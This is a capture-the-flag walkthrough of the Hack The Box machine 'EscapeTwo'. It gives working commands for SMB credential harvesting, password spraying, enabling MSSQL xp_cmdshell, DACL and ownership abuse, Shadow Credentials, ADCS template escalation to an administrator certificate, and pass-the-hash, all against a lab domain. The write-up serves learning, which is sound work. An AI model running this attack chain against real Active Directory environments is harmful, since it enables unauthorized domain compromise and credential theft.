# EscapeTwo

## TL;DR

As it is my first ever AD machine, this was really painful but I learned A LOT, really a lot about AD, ADCS, Kerberos, ADCS Templates and bunch of other stuff. So the machine: It's all about enumeration at first, **clear-text** on SMB shares, you just have to dig good enough and find them in an **xlsx file**. Then combine the creds to form **user/pass wordlists** and get a successful hit with a user account that will help us enumerate the users present on the domain. Then **extract some other clear-text creds** within the **MSSQL client of the MSSQL service account** and combine it with the other wordlist to finally get a valid user account through a **password spraying attack** to get a foothold with **evilwin-rm** since, luckily, he has the needed rights to. For root, **Bloodhound** to map the AD environment and discover some interesting privileges and **permissions on the CA\_SVC**, then ==A LOT== of enumeration and manipulating the **CA templates, ownerships**, to finally combine all that to perform a **Shadow Credentials** attack and dump a NT hash of the administrator, and LUCKILY, no cracking, just perform a simple **Pass the Hash** attack with evilwin-rm.

## Enumeration

### Nmap

When facing windows machine, before I execute any Nmap scripts I like to list the ports first, to have an idea about the protocols and services in use to map it in our mind a bit so that the output of the scripts won't be confusing later or I don't miss out anything useful. So I run:

```bash
$ nmap $target -vv -Pn -oN esctwo-ports
```

Which indeed lists lots of open ports: !\[\[nmap ports.png]]

1. **53/TCP** for DNS.
2. **139/445/TCP** for **SMB.**
3. **88/464/TCP** for **Kerberos**.
4. **389/636/3268/3269/TCP** respectfully for **LDAP** plain text, LDAP SSL, LDAP connection to Global Catalog and LDAP connection to Global Catalog over SSL.
5. **1433/TCP** for an **MSSQL database** management services.
6. **5985/TCP** for **WinRM**. Could be useful later for lateral movement if needed.
7. **593/135/TCP** for MSRPC.

So we're facing Active Directory and we should keep in mind that the host(s) we'll attack could be domain-joined.

Now let's run some Nmap scripts:

```bash
nmap $target -sC -sV -vv -Pn -oN esctwo-def-scan
```

Before we proceed with our enumeration, we should add these entries to the `/etc/hosts` file:

!\[\[nmap hosts.png]] So the `/etc/hosts` should look something like this: !\[\[hosts entry.png]]

### LDAP

#### LDAP users

```bash
ldapsearch -x -H ldap://DC01.sequel.htb -D "rose@sequel.htb" -w 'KxEPkKe6R8su' -b "DC=sequel,DC=htb" "(objectClass=user)" | grep "sAMAccountName"

sAMAccountName: Administrator
sAMAccountName: Guest
sAMAccountName: DC01$
sAMAccountName: krbtgt
sAMAccountName: michael
sAMAccountName: ryan
sAMAccountName: oscar
sAMAccountName: sql_svc
sAMAccountName: rose
sAMAccountName: ca_svc
```

This is so important, these user/service accounts are the ones we will be targeting later in privesc and for the foothold.

#### LDAP Groups

```bash
ldapsearch -x -H ldap://DC01.sequel.htb -D "rose@sequel.htb" -w 'KxEPkKe6R8su' -b "DC=sequel,DC=htb" "(objectClass=group)" | grep "cn:"
```

Which printed out the groups existing on the machine. Just a good practice nothing to retrieve just yet.

### SMB

SMB is always my go-to target when I'm facing a Windows machine, since there's a high chance I get good intel from the shares (if any exist :D)

```bash
nxc smb $target -u 'rose' -p 'KxEPkKe6R8su' --shares
```

!\[\[rose shares.png]]

#### Users Share

```bash
smbclient -U 'rose' //$target/Users
```

!\[\[smb as rose.png]]Going to the Default directory !\[\[users shares default dir.png]] Then I downloaded all the NTUSER.DAT files because according to [this](https://answers.microsoft.com/en-us/windows/forum/all/what-is-the-ntuserdat-file/fd3f2951-1691-4caf-ba1e-97864b1e2a57), _NTUSER.DAT_ is a windows generated file which contains the information of the user account settings and customizations. So that was enough for me to go and discover what could be obtained from these.

```bash
smb: \Default\> mget NTUSER.DA*
```

We'll keep those and move further before diving into anything more deeply. Rabbit holes ahead.

#### Accounting Department Share

```bash
smbclient -U 'rose' //$target/Accounting\ Department
```

!\[\[Accoutning Dep.png]]This was the first rabbit hole for me. I kept searching withing the directories and literally overlooked some clear-text creds. So I did what? Went back to t hose `NTUSER.dat` files and went on and on with the analysis of those files. For like, hours? But anyway here is the shit I found before finding the good looking creds: !\[\[user mails xml.png]] And another user from the dev department maybe ? `Ruy` or whatsoever: !\[\[ruy user.png]] After And here are the creds in the sharedStrings xml file: !\[\[creds.png]] Then I proceeded further to brute force that smb service to get some valid creds before jumping into that MSSQL account:

```bash
nxc smb $target -u users.txt -p pass.txt
```

And we got a hit for the user oscar: !\[\[nxc brute-force.png]] Which I thought was useless at this point. But we'll see how this is a a key thing too reconstruct the attack for the foothold.

### MSSQL

With the sa user credentials we found, let's connect to the MSSQL server :

```bash
impacket-mssqlclient 'sa:MSSQLP@ssw0rd!@10.10.11.51'
```

```bash
SQL (sa  dbo@master)> select user_name()
      
---   
dbo   

SQL (sa  dbo@master)> select is_srvrolemember('sysadmin')
    
-   
1
SQL (sa  dbo@master)> SELECT name FROM master.sys.tables;
---------------------   
spt_fallback_db         

spt_fallback_dev        

spt_fallback_usg        

spt_monitor             

MSreplication_options 
```

This showed only system tables, nothing not ordinary so we should proceed further to xp\_cmdshell:

```bash
EXEC sp_configure 'show advanced options', 1 
RECONFIGURE;  
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;  
EXEC xp_cmdshell 'whoami';
output           
--------------   
sequel\sql_svc   

NULL  
```

So we can now execute commands through the MSSQL server

!\[\[cmdshell test.png]]

A simple File System enumeration and we find the SQL2019 directory.

!\[\[cmdshell dir.png]]

A bit deeper inside the directory the file `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI` contains clear text credentials we haven't run into yet: !\[\[sql\_svc password.png]]

At this point I repeated exactly everything we did with the user rose, smb, evilwin-rm, LDAP again, MSRPC. And it led to nothing.

***

***

## Foothold - User flag

Given the valid credentials of oscar user which I thought were useless, we can indeed brute force the smb service with the valid creds we had from the beginning ==WITH THE PASSWORD WE JUST FOUND==. So after adding the new entries to the users and passwords files we run:

```bash
 nxc smb 10.10.11.51 --rid-brute -u users.txt -p pass.txt                       
```

Leading to this: !\[\[rid brurte.png]] So now collecting the names and performing a password spraying attack on them using:

```bash
nxc smb $target -u names.txt -p '<sql_svc-password>'
```

!\[\[ryan creds.png]]Now evilwin-rm works and we get the user flag:

```bash
evil-winrm -i 10.10.11.51 -u ryan -p 'password'
```

***

## Root

Once we have access with evilwin-rm, I tried the things I know to enumerate a Windows machine, SAM database, LSASS, hives...etc nothing worked. So after searching A LOT, with no knowledge in AD, Bloodhound came in. Which is a tool that identifies attack paths and relationships in an AD environment and builds up an attack vector maybe? The description alone was interesting enough for me to get it asap. So let's get it to work using [this](https://www.kali.org/tools/bloodhound/) guide. Once it is set, we have two ways to do this:

1. We can transfer a binary known as `SharpHound.exe` onto the target, execute it, then transfer the .`json` files back to our kali box and then upload them into `bloodhound`.
2. We can run `bloodhound-python` directly from our kali box, given a set of valid credentials against the AD environment, and then upload the `.json` files into `bloodhound`. This option is more straight forward as it removes the need to transfer `SharpHound.exe` onto the target. For now, tired enough, I'll just use bloodhound-python.

```bash
bloodhound-python -c All -u ryan -p <password> -d sequel.htb -ns 10.10.11.51
```

This outputs a list of JSON files we will upload to Bloodhound. After some poking around in the reconstructed network, ownerships, privileges...etc I found this for the `ryan` user: !\[\[ca\_svc.png]] For the HACKER\* accounts I supposed they were some noise coming from other users on the network so forget about it. Let's focus on `CA_SVC` and that permission we have over it `WriteOwner` `CA` means certificate authority, the name in itself, the permissions we have in the context of `ryan` is enough for us to go this way. But it's an opportunity to know more about AD.

### ADCS

There is [this great paper](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) about ADCS, background, and ways to exploit. A must read, simply.

> Active Directory security has had a huge surge in interest over the last several years. While several aspects of Active Directory have received thorough attention from a security perspective, one area that has been relatively overlooked is Active Directory Certificate Services (AD CS). AD CS is Microsoftâ€™s PKI implementation that integrates with existing Active Directory forests, and provides everything from encrypting file systems, to digital signatures, to user authentication (a large focus of this paper), and more. While AD CS is not installed by default for Active Directory environments, from our experience it is widely deployed.

ADCS (Active Directory Certificate Services) is a Microsoft service that provides public key infrastructure (PKI) for an Active Directory (AD) environment. It is used to manage digital certificates, which help secure communications and authenticate users, computers, and services within a network. Some of its role are:

1. **Issuing Certificates**: ADCS can issue digital certificates for a variety of purposes, such as user authentication, email encryption, code-signing, and secure communications (SSL/TLS). (pretty basic like any other service that issues certificates)
2. **Certificate Authorities (CA)**: The one that issues certificates based on user or computer information stored in AD.
3. **Certificate Templates**: These are predefined configurations in ADCS that define what kind of certificates can be issued, how they are validated, and the scope of their use. While researching, the ones that really got my attention were:
4. The templates as they are predefined configurations, some any misconfiguration is a plus for us.
5. The CA which we, in the context of `ryan`, have `WriteOwner` permissions to. So intuitively we will aiming at owning that `CA_SVC` account and from there craft or dump certificates of high-privileged accounts. !\[\[bloodhound owenership.png]]

Enough with theory, BUT a research is crucial to better understand this ADCS. Here are the resources I read, and I recommend you do too: [Shadow creds](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials). [Granting rights](https://www.thehacker.recipes/ad/movement/dacl/grant-rights). [Certificate Template Access Control exploitation](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html#vulnerable-certificate-template-access-control---esc4).

### Exploitation

Personally I fell into many rabbit holes due to the bloodhound suggestions in the Abuse section. I was amazed by the tool since it's my first time running it. But after hours, I found my way.

#### Step 1: Change ownership of `ca_svc` Object

Well we have WriteOwner, we could take ownership of this object and get Full Control over the CA configuration, compromise the Certificate Authority and abuse the templates that are associated with privileged users .

```bash
bloodyAD --host '10.10.11.51' -d 'sequel.htb' -u 'ryan' -p 'password' set owner 'ca_svc' 'ryan'
```

Which upon success prints out: !\[\[step 1 blooAD success.png]]

#### Step 2: Grant Full Control rights

```bash
impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"password"

<SNIP>
[*] DACL backed up to dacledit-20250227-135446.bak
[*] DACL modified successfully!

```

#### Step 3:

We will be performing Shadow Credentials attack to get an NT hash of the ca\_svc account.

```bash
certipy-ad shadow auto -u 'ryan@sequel.htb' -p "password" -account 'ca_svc' -dc-ip '10.10.11.51'
```

!\[\[shadow creds.png]]

#### Step 4: Finding vulnerable templates

As easy as it is with automated tools, I chose to go through the templates manually to understand why they're marked vulnerable. Until I found this: !\[\[vuln template.png]]

The name is fishy, Allow Enroll for domain admins, entreprise admins and Cert publishers AKA us with the user ryan. So this is our target template. `DunderMifflinAuthentication`

#### Step 5: Updating the Template

```bash
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
	<SNIP>
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

#### Step 6: Getting verified

```bash
certipy-ad req -u ca_svc -hashes 'hash' -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
	<SNIP>
[*] Saved certificate and private key to 'administrator_10.pfx'
```

!\[\[Pasted image 20250227202705.png]]

#### Step 7: Dumping admin NT hash

```bash
certipy-ad auth -pfx administrator_10.pfx  -domain sequel.htb
```

!\[\[Pasted image 20250227202737.png]]

#### Step 8: PtH through evilwin-rm

!\[\[Pasted image 20250227202902.png]] Such a tiring, rewarding and fun machine!
